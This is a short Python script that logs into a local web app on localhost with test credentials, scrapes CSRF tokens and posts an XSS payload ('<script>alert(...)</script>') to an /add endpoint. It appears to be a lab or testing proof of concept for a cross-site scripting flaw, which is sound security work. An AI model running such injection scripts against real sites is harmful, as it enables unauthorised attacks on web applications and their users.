import requests
from bs4 import BeautifulSoup

port = "5101"
url = f"http://localhost:{port}"

payload = "<script>alert(\"alert\")</script>"

s = requests.Session()

# Login
r = s.get(url + "/login")
token = BeautifulSoup(r.text, "html.parser").find("input", {"id": "csrf_token"})['value']

r = s.post(url + "/login", {"csrf_token": token, "username": "user1", "password": "user1"})

# Reflect Script
r = s.get(url + "/add")
token = BeautifulSoup(r.text, "html.parser").find("input", {"id": "csrf_token"})['value']

r = s.post(url + "/add", {"csrf_token": token, "message": payload})

print(r.text)